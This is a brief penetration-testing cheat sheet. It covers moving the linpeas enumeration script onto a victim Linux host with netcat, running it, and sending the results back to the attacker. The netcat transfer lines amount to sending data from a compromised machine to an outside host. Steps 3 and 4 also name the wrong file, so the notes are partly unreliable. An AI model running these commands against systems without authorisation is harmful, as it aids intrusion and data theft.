# Linux
## Privilege Escalation
### Enumerating Vulnerabilities with `linpeas`
1. Transfer `linpeas` to target
*Clone an updated version of `linpeas`:*
```sh
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

*Victim*:
```sh
nc -l -p 6969 > linpeas.sh
```

*Attacker:*
```sh
nc {victim} 6969 < linpeas.sh
```

2. Run `linpeas` and send the result back
*Making the file executable:*
```sh
chmod +x linpeas.sh
```

*Running `linpeas`*
```sh
./linpeas.sh > result.txt
```

3. Send the result back
*Attacker*:
```sh
nc -l -p 6969 > linpeas.sh
```

*Victim:*
```sh
nc {Attacker} 6969 < linpeas.sh
```

4. Read the result
```sh
less -R linpeas.sh
```
